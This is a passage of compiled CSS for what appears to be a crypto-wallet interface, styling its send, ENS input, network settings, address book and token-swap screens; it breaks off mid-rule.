      .send__select-recipient-wrapper__list__back-caret {
      display: block;
      background-image: url("/images/caret-left.svg");
      width: 18px;
      height: 18px;
      margin-right: 0.5rem; }
      [dir='rtl'] .send__select-recipient-wrapper__list__back-caret {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); }
      .send__select-recipient-wrapper__recent-group-wrapper__load-more {
      font-size: 0.75rem;
      line-height: 1.0625rem;
      padding: 0.5rem;
      text-align: center;
      border-bottom: 1px solid #dedede;
      justify-content: flex-start; }
      .send__select-recipient-wrapper__group-label {
      font-style: normal;
      font-weight: normal;
      font-size: 0.625rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      background-color: #f2f3f4;
      color: #535a61;
      line-height: 0.875rem;
      padding: 0.5rem 1rem;
      border-bottom: 1px solid #dedede; }
      .send__select-recipient-wrapper__group-label:first-of-type {
      border-top: 1px solid #dedede; }
      .send__select-recipient-wrapper__group-item, .send__select-recipient-wrapper__group-item--selected {
      padding: 0.75rem 1rem;
      align-items: center;
      border-bottom: 1px solid #dedede;
      cursor: pointer; }
      .send__select-recipient-wrapper__group-item:hover, .send__select-recipient-wrapper__group-item--selected:hover {
      background-color: rgba(222, 222, 222, 0.2); }
      .send__select-recipient-wrapper__group-item .identicon, .send__select-recipient-wrapper__group-item--selected .identicon {
      margin-right: 1rem;
      flex: 0 0 auto; }
      .send__select-recipient-wrapper__group-item__content, .send__select-recipient-wrapper__group-item--selected__content {
      flex: 1 1 auto;
      width: 0; }
      .send__select-recipient-wrapper__group-item__title, .send__select-recipient-wrapper__group-item--selected__title {
      font-size: 0.875rem;
      line-height: 1.25rem;
      color: #000; }
      .send__select-recipient-wrapper__group-item__subtitle, .send__select-recipient-wrapper__group-item--selected__subtitle {
      font-style: normal;
      font-weight: normal;
      font-size: 0.625rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #6a737d; }
      .send__select-recipient-wrapper__group-item--selected {
      border: 2px solid #2b7cd6;
      border-radius: 8px; }
      .ens-input__wrapper {
      flex: 1 1 auto;
      width: 0;
      align-items: center;
      background: #fff;
      border-radius: 0.5rem;
      padding: 0.75rem 0.5rem;
      border: 1px solid #d6d9dc;
      transition: border-color 150ms ease-in-out; }
      .ens-input__wrapper:focus-within {
      border-color: #6a737d; }
      .ens-input__wrapper__status-icon {
      background-image: url("/images/search-black.svg");
      width: 1.125rem;
      height: 1.125rem;
      margin: 0.25rem 0.5rem 0.25rem 0.25rem; }
      .ens-input__wrapper__status-icon--valid {
      background-image: url("/images/check-green-solid.svg"); }
      .ens-input__wrapper__input {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      flex: 1 1 auto;
      width: 0;
      border: 0;
      outline: none; }
      .ens-input__wrapper__input::-webkit-input-placeholder {
      color: #bbc0c5; }
      .ens-input__wrapper__input::-moz-placeholder {
      color: #bbc0c5; }
      .ens-input__wrapper__input::-ms-input-placeholder {
      color: #bbc0c5; }
      .ens-input__wrapper__input::placeholder {
      color: #bbc0c5; }
      .ens-input__wrapper__action-icon {
      cursor: pointer; }
      .ens-input__wrapper__action-icon--erase {
      background-image: url("/images/close-gray.svg");
      width: 0.75rem;
      height: 0.75rem;
      margin: 0 0.25rem; }
      .ens-input__wrapper__action-icon--qrcode {
      background-image: url("/images/qr-blue.svg");
      width: 1.5rem;
      height: 1.5rem;
      margin: 0 0.25rem; }
      .ens-input__wrapper--valid {
      border-color: #037dd6; }
      .ens-input__wrapper--valid .ens-input__wrapper__status-icon {
      background-image: url("/images/check-green-solid.svg"); }
      .ens-input__wrapper--valid .ens-input__wrapper__input {
      font-size: 0.75rem;
      line-height: 0.75rem;
      font-weight: 400;
      color: #037dd6; }
      .ens-input__selected-input__title {
      font-size: 0.875rem; }
      .ens-input__selected-input__subtitle {
      font-size: 0.75rem;
      color: #6a737d;
      margin-top: 0.25rem; }
      .info-tab__logo-wrapper {
      height: 80px;
      margin-bottom: 20px; }
      .info-tab__logo {
      max-height: 100%;
      max-width: 100%; }
      .info-tab__item {
      padding: 10px 0; }
      .info-tab__link-header {
      padding-bottom: 15px; }
      @media screen and (max-width: 575px) {
      .info-tab__link-header {
      padding-bottom: 5px; } }
      .info-tab__link-text {
      width: -webkit-max-content;
      width: -moz-max-content;
      width: max-content;
      padding: 0; }
      .info-tab__link-item {
      padding: 15px 0; }
      @media screen and (max-width: 575px) {
      .info-tab__link-item {
      padding: 5px 0; } }
      .info-tab__version-number {
      padding-top: 5px;
      font-size: 13px;
      color: #9b9b9b; }
      .info-tab__separator {
      margin: 15px 0;
      width: 80px;
      border-color: #dedede;
      border: none;
      height: 1px;
      background-color: #dedede;
      color: #dedede; }
      .info-tab__about {
      color: #9b9b9b;
      margin-bottom: 15px; }
      .alerts-tab__body {
      display: grid;
      grid-template-columns: 8fr 30px -webkit-max-content;
      grid-template-columns: 8fr 30px max-content;
      grid-template-rows: 1fr 1fr;
      font-size: 14px;
      align-items: center; }
      .alerts-tab__body > * {
      border-bottom: 1px solid #d6d9dc;
      padding: 16px 8px;
      height: 100%; }
      .alerts-tab__body > :first-child {
      padding-left: 32px; }
      .alerts-tab__body > :nth-child(3n+4) {
      padding-left: 32px; }
      .alerts-tab__body > :nth-child(3n) {
      padding-right: 32px; }
      .alerts-tab__description {
      display: flex;
      align-items: center; }
      .networks-tab__content {
      margin-top: 24px;
      display: flex;
      height: 100%;
      max-width: 739px;
      justify-content: space-between; }
      @media screen and (max-width: 575px) {
      .networks-tab__content {
      margin-top: 0; } }
      .networks-tab__body {
      padding-right: 24px;
      height: 100%;
      display: flex;
      flex-direction: column; }
      @media screen and (max-width: 575px) {
      .networks-tab__body {
      padding: 0; } }
      .networks-tab__back-button {
      display: none; }
      @media screen and (max-width: 575px) {
      .networks-tab__back-button {
      display: block;
      background-image: url("/images/caret-left-black.svg");
      width: 18px;
      height: 18px;
      opacity: 0.5;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      margin-right: 16px;
      cursor: pointer;
      position: absolute;
      margin-left: 10px; }
      [dir='rtl'] .networks-tab__back-button {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); } }
      .networks-tab__network-form {
      flex: 0.5 0 auto;
      max-width: 343px;
      max-height: 465px;
      display: flex;
      flex-direction: column;
      justify-content: space-between; }
      .networks-tab__network-form .page-container__footer {
      border-top: none; }
      @media screen and (max-width: 575px) {
      .networks-tab__network-form .page-container__footer {
      width: 93%; } }
      .networks-tab__network-form .page-container__footer footer {
      padding: 10px 0; }
      @media screen and (max-width: 575px) {
      .networks-tab__network-form {
      display: flex;
      flex: auto;
      max-width: 100%;
      max-height: 100%;
      align-items: center;
      width: 100%;
      margin-top: 10px; } }
      @media screen and (max-width: 575px) {
      .networks-tab__network-form-row {
      display: flex;
      flex-direction: column;
      width: 93%; } }
      .networks-tab__network-form-row--warning {
      background-color: #fefae8;
      border: 1px solid #ffd33d;
      width: 93%;
      border-radius: 5px;
      box-sizing: border-box;
      padding: 12px;
      margin: 12px 0;
      font-size: 12px; }
      .networks-tab__network-form-label {
      display: flex;
      align-items: center; }
      .networks-tab__network-form-label-text {
      font-family: Roboto;
      font-style: normal;
      font-weight: normal;
      font-size: 14px;
      line-height: 20px;
      color: #000; }
      .networks-tab__network-form-label-tooltip {
      margin-left: 5px;
      font-size: 12px; }
      .networks-tab__networks-list {
      flex: 0.5 0 auto;
      max-width: 343px; }
      @media screen and (max-width: 575px) {
      .networks-tab__networks-list {
      max-width: 100vw;
      width: 100vw;
      overflow-y: scroll; } }
      .networks-tab__add-network-button-wrapper {
      display: none; }
      @media screen and (max-width: 575px) {
      .networks-tab__add-network-button-wrapper {
      display: flex;
      padding-top: 19px;
      padding-bottom: 23px;
      justify-content: center;
      align-items: center;
      border-top: 1px solid #d8d8d8; }
      .networks-tab__add-network-button-wrapper .button {
      width: 178px; } }
      .networks-tab__add-network-header-button-wrapper {
      justify-content: center; }
      .networks-tab__add-network-header-button-wrapper .button {
      width: 138px;
      padding: 10px;
      line-height: 20px; }
      @media screen and (max-width: 575px) {
      .networks-tab__add-network-header-button-wrapper {
      display: none; } }
      @media screen and (max-width: 575px) {
      .networks-tab__networks-list--selection {
      display: none; } }
      .networks-tab__networks-list-item {
      display: flex;
      padding: 13px 0 13px 17px;
      position: relative; }
      .networks-tab__networks-list-item .menu-icon-circle:hover {
      cursor: pointer; }
      @media screen and (max-width: 575px) {
      .networks-tab__networks-list-item {
      padding: 20px 23px 21px 17px;
      border-bottom: 1px solid #d8d8d8; } }
      @media screen and (max-width: 575px) {
      .networks-tab__networks-list-item:last-of-type {
      border-bottom: none; } }
      .networks-tab__networks-list-name {
      margin-left: 11px;
      font-style: normal;
      font-weight: normal;
      font-size: 16px;
      line-height: 23px;
      color: #6a737d; }
      .networks-tab__networks-list-name:hover {
      cursor: pointer; }
      .networks-tab__networks-list-name svg {
      margin-left: 10px;
      padding-top: 3px; }
      .networks-tab__networks-list-arrow {
      display: none; }
      @media screen and (max-width: 575px) {
      .networks-tab__networks-list-arrow {
      display: block;
      background-image: url("/images/caret-right.svg");
      width: 24px;
      height: 24px;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      right: 10px;
      cursor: pointer;
      position: absolute;
      width: 24px;
      height: 24px; }
      [dir='rtl'] .networks-tab__networks-list-arrow {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); } }
      .networks-tab__networks-list-name--selected {
      font-weight: bold;
      color: #000; }
      .networks-tab__networks-list-name--disabled {
      font-weight: 300;
      color: #cdcdcd; }
      .network-form__footer {
      display: flex;
      flex-flow: row nowrap;
      margin: 0.75rem 0; }
      .network-form__footer .btn-default {
      margin-right: 0.375rem; }
      .network-form__footer .btn-secondary {
      margin-left: 0.375rem; }
      .network-form__footer .btn-danger {
      margin-right: 3.75rem; }
      .settings-tab__error {
      padding-bottom: 20px;
      text-align: center;
      color: #e91550; }
      .settings-tab__rpc-save-button {
      align-self: flex-end;
      padding: 5px;
      cursor: pointer;
      width: 25%; }
      .settings-tab__button--red {
      border-color: #fd0826;
      color: #d0021b; }
      .settings-tab__button--red:active {
      background: #ffecee;
      border-color: #d0021b; }
      .settings-tab__button--red:hover {
      border-color: #d0021b; }
      .settings-tab__radio-buttons {
      display: flex;
      align-items: center; }
      .settings-tab__radio-button {
      display: flex;
      align-items: center; }
      .settings-tab__radio-button:not(:last-child) {
      margin-right: 16px; }
      .settings-tab__radio-label {
      padding-left: 4px; }
      .address-book-wrapper {
      display: flex;
      justify-content: space-between;
      height: 100%; }
      .address-book {
      flex: 0.4 1 40%;
      max-width: 40%; }
      @media screen and (max-width: 576px) {
      .address-book {
      flex: 1;
      max-width: 100%; } }
      .address-book__entry {
      display: flex;
      flex-flow: row nowrap;
      padding: 16px 14px;
      flex: 0 0 auto;
      border-bottom: 1px solid #dedede; }
      .address-book__entry:hover {
      border: 1px solid #037dd6;
      cursor: pointer; }
      .address-book__name {
      padding: 3px; }
      .address-book__header__name, .address-book__header--edit__name {
      font-style: normal;
      font-weight: normal;
      font-size: 24px;
      line-height: 34px;
      margin-left: 24px; }
      .address-book__header--edit {
      display: flex;
      justify-content: space-between; }
      .address-book__header--edit .button {
      justify-content: flex-end;
      color: #d73a49;
      font-size: 14px; }
      .address-book__input {
      border: 2px solid #bbc0c5;
      border-radius: 6px;
      color: #24272a;
      padding: 0.875rem 1rem;
      font-size: 1.125rem;
      margin-top: 0.25rem; }
      .address-book__input:focus-within {
      border-color: #037dd6; }
      .address-book__input--address {
      font-size: 0.875rem; }
      .address-book__view-contact__text-area-wrapper {
      height: 96px !important; }
      .address-book__view-contact__text-area {
      line-height: initial !important; }
      .address-book__view-contact__group {
      display: flex;
      flex-flow: column nowrap;
      padding: 1.5rem 1.5rem 0 1.5rem; }
      .address-book__view-contact__group__label, .address-book__view-contact__group__label--capitalized {
      font-size: 0.75rem;
      color: #6a737d;
      margin-bottom: 0.25rem; }
      .address-book__view-contact__group__label--capitalized {
      text-transform: capitalize; }
      .address-book__view-contact__group__value, .address-book__view-contact__group__static-address {
      display: flex;
      flex-flow: row nowrap;
      font-size: 1.125rem;
      color: #24272a;
      word-break: break-word; }
      .address-book__view-contact__group__value--address, .address-book__view-contact__group__static-address--address {
      font-size: 0.875rem; }
      .address-book__view-contact__group__value--copy-icon, .address-book__view-contact__group__static-address--copy-icon {
      display: inline-block;
      width: 20px;
      height: 20px;
      padding: 0;
      background: none;
      padding-left: 0;
      margin-left: 10px; }
      .address-book__view-contact__group__static-address {
      font-size: 0.875rem; }
      .address-book__view-contact__group__static-address--copy-icon {
      cursor: pointer; }
      .address-book__view-contact__group__static-address--copy-icon:hover {
      color: black; }
      .address-book__view-contact__group .unit-input__input {
      max-width: 100%;
      width: 100%; }
      .address-book__edit-contact {
      display: flex;
      flex-flow: column nowrap;
      padding-bottom: 0 !important;
      height: 100%; }
      .address-book__edit-contact__content {
      flex: 1 1 auto; }
      .address-book__edit-contact__content > div {
      padding-top: 0; }
      .address-book__edit-contact .page-container__footer {
      border-top: none; }
      .address-book__add-contact {
      display: flex;
      flex-flow: column nowrap;
      padding-bottom: 0 !important;
      height: 100%; }
      .address-book__add-contact__content {
      flex: 1 1 auto;
      height: 100%; }
      .address-book__add-contact__error {
      font-size: 12px;
      line-height: 12px;
      left: 8px;
      color: #f00; }
      .address-book__my-accounts-button {
      display: flex;
      flex-flow: column;
      cursor: pointer;
      padding: 15px; }
      .address-book__my-accounts-button:hover {
      background-color: rgba(222, 222, 222, 0.2); }
      .address-book__my-accounts-button__header {
      font-style: normal;
      font-weight: normal;
      font-size: 18px;
      line-height: 25px;
      color: #000; }
      .address-book__my-accounts-button__content {
      display: flex;
      justify-content: space-between; }
      .address-book__my-accounts-button__text {
      font-style: normal;
      font-weight: normal;
      font-size: 14px;
      line-height: 20px;
      color: #6a737d; }
      .address-book__my-accounts-button__caret {
      display: block;
      background-image: url(/images/caret-right.svg);
      width: 30px;
      opacity: 0.5;
      background-repeat: no-repeat; }
      [dir='rtl'] .address-book__my-accounts-button__caret {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); }
      .address-book-add-button__button {
      position: absolute;
      top: 10px;
      right: 16px;
      height: 56px;
      width: 56px;
      border-radius: 18px;
      display: flex;
      justify-content: center;
      align-items: center;
      border-radius: 50%;
      border-width: 2px;
      background: #037dd6;
      margin-right: 5px;
      cursor: pointer;
      box-shadow: 0 2px 16px rgba(0, 0, 0, 0.25); }
      .address-book--hidden {
      display: none; }
      .address-book-contact-content {
      flex: 0.4 1 40%; }
      @media screen and (max-width: 576px) {
      .address-book-contact-content {
      flex: 1; } }
      .settings-page {
      position: relative;
      background: #fff;
      display: flex;
      flex-flow: column nowrap; }
      .settings-page__header {
      display: flex;
      flex-flow: row nowrap;
      padding: 12px 24px;
      align-items: center;
      flex: 0 0 auto; }
      .settings-page__header__title {
      flex: 1 0 auto;
      font-size: 24px; }
      .settings-page__subheader, .settings-page__subheader--link {
      padding: 16px 4px;
      font-size: 20px;
      border-bottom: 1px solid #dedede;
      margin-right: 24px;
      height: 72px;
      align-items: center;
      display: flex;
      flex-flow: row nowrap; }
      @media screen and (max-width: 575px) {
      .settings-page__subheader, .settings-page__subheader--link {
      display: none; } }
      .settings-page__subheader--link {
      cursor: pointer;
      margin-right: 4px; }
      .settings-page__subheader--link:hover {
      cursor: pointer;
      color: #037dd6; }
      .settings-page__subheader--break {
      margin-right: 4px;
      padding-right: 4px; }
      .settings-page__sub-header {
      height: 72px;
      border-bottom: 1px solid #d8d8d8;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 16px 0; }
      @media screen and (max-width: 575px) {
      .settings-page__sub-header {
      height: 69px;
      position: relative;
      text-align: center; } }
      .settings-page__sub-header-text {
      font-style: normal;
      font-weight: normal;
      font-size: 20px; }
      @media screen and (max-width: 575px) {
      .settings-page__sub-header-text {
      font-size: 16px;
      width: 100%; } }
      .settings-page__back-button {
      display: none; }
      @media screen and (max-width: 575px) {
      .settings-page__back-button {
      display: block;
      background-image: url("/images/caret-left-black.svg");
      width: 18px;
      height: 18px;
      opacity: 0.5;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      margin-right: 16px;
      cursor: pointer; }
      [dir='rtl'] .settings-page__back-button {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); } }
      .settings-page__close-button::after {
      content: '\00D7';
      font-size: 40px;
      color: #9b9b9b;
      cursor: pointer; }
      .settings-page__content {
      display: flex;
      flex-flow: row nowrap;
      height: 100%;
      overflow: auto;
      border-top: 1px solid #d8d8d8; }
      .settings-page__content__tabs {
      display: flex;
      flex-direction: column;
      flex: 1 1 auto; }
      @media screen and (min-width: 576px) {
      .settings-page__content__tabs {
      flex: 0 0 40%;
      max-width: 210px;
      padding-top: 8px; } }
      @media screen and (min-width: 576px) {
      .settings-page__content__tabs .tab-bar__tab {
      padding: 16px 24px 0; } }
      .settings-page__content__modules {
      overflow-y: auto;
      flex: 1 1 auto;
      display: flex;
      flex-flow: column; }
      @media screen and (max-width: 575px) {
      .settings-page__content__modules {
      display: none; } }
      .settings-page__body {
      padding: 12px 24px; }
      @media screen and (min-width: 576px) {
      .settings-page__body {
      padding: 12px; } }
      .settings-page__content-row {
      display: flex;
      flex-direction: column;
      padding: 10px 0 20px; }
      .settings-page__content-item {
      flex: 1;
      min-width: 0;
      display: flex;
      flex-direction: column;
      margin-bottom: 20px; }
      @media screen and (max-width: 575px) {
      .settings-page__content-item {
      height: initial;
      padding: 5px 0; } }
      .settings-page__content-item--without-height {
      height: initial; }
      .settings-page__content-item--disabled {
      cursor: not-allowed;
      opacity: 0.5; }
      .settings-page__content-label {
      text-transform: capitalize; }
      .settings-page__content-description {
      font-size: 14px;
      color: #9b9b9b;
      padding-top: 5px; }
      .settings-page__content-item-col {
      max-width: 300px;
      display: flex;
      flex-direction: column; }
      @media screen and (max-width: 575px) {
      .settings-page__content-item-col {
      max-width: 100%;
      width: 100%; } }
      .settings-page__copy-icon {
      padding-left: 4px; }
      .settings-page__button-group {
      display: flex;
      margin-left: auto; }
      .settings-page__address-book-button {
      font-size: 1rem;
      line-height: 1.1875rem;
      padding: 0; }
      .settings-page__address-book-button + .settings-page__address-book-button {
      margin-left: 1.875rem; }
      @media screen and (max-width: 575px) {
      .settings-page--selected .settings-page__content__tabs {
      display: none; } }
      @media screen and (max-width: 575px) {
      .settings-page--selected .settings-page__content__modules {
      display: block; } }
      .settings-page .toggle-button {
      /*rtl:ignore*/
      direction: ltr; }
      [dir='rtl'] .settings-page .toggle-button {
      justify-content: flex-end; }
      .actionable-message {
      background: #eaf6ff;
      border: 1px solid #75c4fd;
      border-radius: 8px;
      padding: 16px;
      margin-top: 18px;
      display: flex;
      flex-flow: column;
      align-items: center;
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%; }
      .actionable-message__message {
      color: #0260a4;
      text-align: center; }
      .actionable-message__actions {
      display: flex;
      width: 80%;
      justify-content: space-evenly;
      align-items: center;
      margin-top: 10px;
      color: #0260a4; }
      .actionable-message__action {
      font-weight: bold;
      cursor: pointer; }
      .actionable-message--warning {
      background: #fefcde;
      border: 1px solid #ffd33d;
      justify-content: center; }
      .actionable-message--warning .actionable-message__message,
      .actionable-message--warning .actionable-message__action {
      color: #24292e; }
      .actionable-message--warning .actionable-message__action--secondary {
      text-decoration: underline; }
      .actionable-message--danger {
      background: #f7d5d8;
      border: 1px solid #d73a49;
      justify-content: flex-start; }
      .actionable-message--danger .actionable-message__message {
      color: #d73a49; }
      .actionable-message--left-aligned .actionable-message__message,
      .actionable-message--left-aligned .actionable-message__actions {
      justify-content: flex-start;
      text-align: left;
      width: 100%; }
      .awaiting-swap {
      display: flex;
      flex-flow: column;
      align-items: center;
      flex: 1;
      width: 100%; }
      .awaiting-swap__content {
      display: flex;
      flex-flow: column;
      justify-content: center;
      height: 100%;
      padding-left: 32px;
      padding-right: 32px; }
      .awaiting-swap div {
      text-align: center;
      display: flex;
      justify-content: center; }
      .awaiting-swap__status-image {
      margin-top: 12px;
      margin-bottom: 16px; }
      .awaiting-swap__header {
      font-style: normal;
      font-weight: normal;
      font-size: 1.5rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #24292e; }
      .awaiting-swap__main-descrption {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      color: #6a737d;
      margin-top: 16px;
      width: 100%; }
      .awaiting-swap__time-estimate {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #24292e;
      margin-top: 20px;
      font-style: italic; }
      .awaiting-swap__time-estimate > span {
      display: flex; }
      .awaiting-swap__time-estimate--invisible {
      visibility: hidden; }
      .awaiting-swap__time-estimate-text {
      margin-right: 2px;
      font-weight: bold; }
      .awaiting-swap__view-on-etherscan {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #037dd6;
      margin-top: 24px;
      cursor: pointer;
      transition: opacity 1s ease-in-out; }
      .awaiting-swap__view-on-etherscan--invisible {
      opacity: 0; }
      .awaiting-swap__view-on-etherscan--visible {
      opacity: 1; }
      .awaiting-swap__amount-and-symbol {
      color: #24292e;
      font-weight: bold; }
      .build-quote {
      display: flex;
      flex-flow: column;
      align-items: center;
      flex: 1;
      width: 100%;
      padding-top: 4px; }
      .build-quote__content {
      display: flex;
      height: 100%;
      flex-direction: column;
      padding-left: 24px;
      padding-right: 24px; }
      .build-quote__content {
      display: flex; }
      .build-quote__dropdown-swap-to-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      width: 100%;
      margin-top: 0;
      margin-bottom: 12px; }
      .build-quote__dropdown-input-pair-header {
      display: flex;
      justify-content: space-between;
      align-items: flex-end;
      width: 100%;
      margin-bottom: 12px;
      flex: 0.5 1 auto;
      max-height: 56px; }
      .build-quote__title, .build-quote__input-label {
      font-style: normal;
      font-weight: normal;
      font-size: 1rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-weight: bold;
      color: #24292e;
      margin-top: 3px; }
      .build-quote__swap-arrows-row {
      width: 100%;
      display: flex;
      justify-content: flex-end;
      padding-right: 16px;
      padding-top: 12px;
      height: 24px;
      position: relative; }
      .build-quote__swap-arrows {
      flex: 0 0 auto;
      height: 16px;
      width: 12px;
      background-image: url(/images/icons/swap2.svg);
      background-size: contain;
      background-repeat: no-repeat;
      position: absolute;
      cursor: pointer; }
      .build-quote__max-button {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #037dd6;
      cursor: pointer; }
      .build-quote__balance-message {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      width: 100%;
      color: #6a737d;
      margin-top: 4px;
      display: flex;
      flex-flow: column; }
      .build-quote__balance-message--error div:first-of-type {
      font-weight: bold;
      color: #24292e; }
      .build-quote__balance-message--error div:last-of-type {
      font-weight: normal;
      color: #6a737d; }
      .build-quote__slippage-buttons-container {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 32px; }
      .build-quote__open-dropdown, .build-quote__open-to-dropdown {
      max-height: 330px;
      box-shadow: 0 0 14px rgba(0, 0, 0, 0.18);
      position: absolute;
      width: 100%; }
      .build-quote__open-to-dropdown {
      max-height: 194px; }
      @media screen and (min-width: 576px) {
      .build-quote__open-to-dropdown {
      max-height: 276px; } }
      .countdown-timer {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-weight: bold;
      display: flex;
      justify-content: center; }
      @media screen and (min-width: 576px) {
      .countdown-timer {
      margin: 0; } }
      .countdown-timer__timer-container {
      display: flex;
      padding-right: 3px; }
      .countdown-timer__timer-container > span {
      display: flex; }
      .countdown-timer__timer-container--warning .countdown-timer__time {
      color: #d73a49; }
      .countdown-timer__time {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      width: 24px;
      margin-left: 4px;
      margin-right: 2px; }
      .countdown-timer div {
      display: flex;
      align-items: center; }
      .dropdown-input-pair {
      display: flex;
      width: 312px;
      height: 60px;
      position: relative; }
      .dropdown-input-pair__input {
      margin: 0 !important; }
      .dropdown-input-pair__input input {
      font-style: normal;
      font-weight: normal;
      font-size: 1.125rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      padding-top: 6px; }
      .dropdown-input-pair__input div {
      border: 1px solid #d6d9dc;
      border-top-left-radius: 0;
      border-bottom-left-radius: 0;
      border-left-color: transparent;
      height: 60px; }
      .dropdown-input-pair__input input::-webkit-outer-spin-button,
      .dropdown-input-pair__input input::-webkit-inner-spin-button {
      /* display: none; <- Crashes Chrome on hover */
      -webkit-appearance: none;
      margin: 0;
      /* <-- Apparently some margin are still there even though it's hidden */ }
      .dropdown-input-pair__input input[type=number] {
      -moz-appearance: textfield;
      /* Firefox */ }
      .dropdown-input-pair__list--full-width {
      width: 100%; }
      .dropdown-input-pair__left-value {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      position: absolute;
      right: 16px;
      height: 100%;
      display: flex;
      align-items: center;
      color: #6a737d; }
      .dropdown-input-pair__left-value--two-lines {
      right: inherit;
      left: 157px;
      align-items: unset;
      top: 34px; }
      .dropdown-input-pair .dropdown-input-pair__selector--closed {
      height: 60px;
      width: 142px;
      border-top-right-radius: 0;
      border-bottom-right-radius: 0; }
      .dropdown-input-pair__two-line-input div {
      align-items: flex-start; }
      .dropdown-input-pair__two-line-input input {
      padding-top: 14px; }
      .dropdown-search-list {
      flex-flow: column;
      border: none; }
      .dropdown-search-list__search-list-open {
      margin: 24px;
      box-shadow: none;
      border-radius: 6px;
      min-height: 297px;
      width: 100%; }
      .dropdown-search-list__token-container {
      margin: 0;
      min-height: auto;
      border: 1px solid #d6d9dc;
      box-sizing: border-box;
      box-shadow: none;
      border-radius: 6px;
      width: 100%; }
      .dropdown-search-list--open {
      box-shadow: 0 0 14px rgba(0, 0, 0, 0.18);
      border: 1px solid #d6d9dc; }
      .dropdown-search-list__selector-closed-container {
      display: flex;
      width: 100%;
      position: relative;
      align-items: center;
      max-height: 60px;
      transition: 200ms ease-in-out;
      border-radius: 6px;
      box-shadow: none;
      border: 1px solid #d6d9dc;
      height: 60px; }
      .dropdown-search-list__selector-closed-container:hover {
      background: #f2f3f4; }
      .dropdown-search-list__caret {
      position: absolute;
      right: 16px;
      color: #bbc0c5; }
      .dropdown-search-list__selector-closed {
      display: flex;
      flex-flow: row nowrap;
      align-items: center;
      padding: 16px 12px;
      box-sizing: border-box;
      cursor: pointer;
      position: relative;
      align-items: center;
      width: 100%;
      height: 60px; }
      .dropdown-search-list__selector-closed i {
      font-size: 1.2em; }
      .dropdown-search-list__selector-closed .dropdown-search-list__item-labels {
      width: 56%; }
      .dropdown-search-list__selector-closed-icon {
      width: 34px;
      height: 34px; }
      .dropdown-search-list__closed-primary-label {
      font-style: normal;
      font-weight: normal;
      font-size: 1.125rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #24292e;
      max-width: 100%;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap; }
      .dropdown-search-list__search-list--open {
      box-shadow: 0 0 14px rgba(0, 0, 0, 0.18);
      border: 1px solid #d6d9dc; }
      .dropdown-search-list__default-dropdown-icon {
      width: 34px;
      height: 34px;
      border-radius: 50%;
      background: #bbc0c5;
      flex: 0 1 auto; }
      .dropdown-search-list__labels {
      display: flex;
      justify-content: space-between;
      width: 100%;
      flex: 1; }
      .dropdown-search-list__item-labels {
      display: flex;
      flex-direction: column;
      justify-content: center;
      margin-left: 8px; }
      .dropdown-search-list__select-default {
      color: #bbc0c5; }
      .dropdown-search-list__placeholder {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      padding: 16px;
      color: #6a737d;
      min-height: 300px;
      position: relative;
      z-index: 1;
      background: white;
      border-radius: 6px;
      min-height: 194px; }
      .dropdown-search-list__loading-item {
      transition: 200ms ease-in-out;
      display: flex;
      flex-flow: row nowrap;
      align-items: center;
      justify-content: center;
      padding: 16px 12px;
      box-sizing: border-box;
      cursor: pointer;
      border-top: 1px solid #d6d9dc;
      position: relative;
      z-index: 1;
      background: #fff; }
      .dropdown-search-list__loading-item-text-container {
      margin-left: 4px; }
      .dropdown-search-list__loading-item-text {
      font-weight: bold; }
      .exchange-rate-display {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      display: flex;
      align-items: flex-end;
      justify-content: center;
      color: #24292e;
      width: 100%;
      flex-wrap: wrap; }
      .exchange-rate-display span {
      margin-right: 4px; }
      .exchange-rate-display__bold {
      font-weight: bold; }
      .exchange-rate-display__switch-arrows {
      cursor: pointer; }
      .exchange-rate-display__switch-arrows > svg {
      margin-top: 4px; }
      .exchange-rate-display__switch-arrows-rotate {
      -webkit-animation-name: rotate-toggle;
      -webkit-animation-duration: 1s;
      transition: all 500ms cubic-bezier(0.86, 0, 0.07, 1);
